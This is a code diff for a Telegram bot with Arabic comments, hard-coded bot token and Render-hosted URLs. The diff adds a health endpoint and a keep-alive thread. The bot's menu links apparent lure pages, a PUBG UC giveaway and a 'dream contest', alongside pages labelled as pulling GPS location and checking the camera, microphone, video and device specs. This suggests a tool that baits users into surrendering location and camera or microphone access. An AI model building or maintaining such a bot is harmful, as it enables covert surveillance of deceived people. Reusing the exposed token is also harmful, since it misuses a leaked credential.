@@ -1,4 +1,4 @@
-import os, sys, subprocess, logging
+import os, sys, subprocess, logging, time, threading, requests
 
 # ========== تثبيت تلقائي للمكتبات ==========
 def ensure_module(package, import_name=None):
@@ -18,7 +18,7 @@ from telebot import TeleBot, types
 # ========== الإعدادات ==========
 TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
 BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات
-APP_URL = "https://gamee-beqx.onrender.com"           # رابط تطبيقك على Render
+APP_URL = "https://gamee-beqx.onrender.com"           # رابط تطبيق البوت
 
 logging.basicConfig(level=logging.INFO)
 bot = TeleBot(TOKEN, threaded=False)
@@ -34,8 +34,13 @@ PAGES = [
     ("🎮 ببجي UC", "pubg_cuc.html"),      ("🏆 مسابقة الحلم", "dream.html"),
     ("📍 سحب الموقع", "gps.html"),        ("📸 فحص الكاميرا", "camera.html"),
     ("🎙️ فحص الميكروفون", "mic.html"),    ("🎥 فحص الفيديو", "video.html"),
-    ("📱 فحص مواصفات الجهاز", "device.html")   # الزر الأخير (سيظهر عريضًا)
+    ("📱 فحص مواصفات الجهاز", "device.html")   # الزر الأخير (عريض)
 ]
+
+# ========== مسار health (لاختبار السيرفر ولمنع السكون) ==========
+@app.route("/health")
+def health():
+    return "OK", 200
 
 # ========== Webhook ==========
 @app.route(f"/{TOKEN}", methods=['POST'])
@@ -127,9 +132,26 @@ def handle_back(call):
     bot.edit_message_text(welcome_text, chat_id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
     bot.answer_callback_query(call.id)
 
+# ========== وظيفة منع السكون (Keep-Alive) ==========
+def keep_alive():
+    while True:
+        time.sleep(120)  # دقيقتين
+        try:
+            requests.get(f"{APP_URL}/health", timeout=5)
+            logging.info("Keep-alive ping sent")
+        except Exception as e:
+            logging.error(f"Keep-alive failed: {e}")
+
 # ========== تشغيل ==========
 if __name__ == '__main__':
+    # تشغيل keep-alive في خيط منفصل
+    threading.Thread(target=keep_alive, daemon=True).start()
+
+    # إعداد webhook
     bot.remove_webhook()
     bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
+    logging.info("✅ Webhook set & bot is running with keep-alive")
+
+    # تشغيل Flask
     PORT = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=PORT)
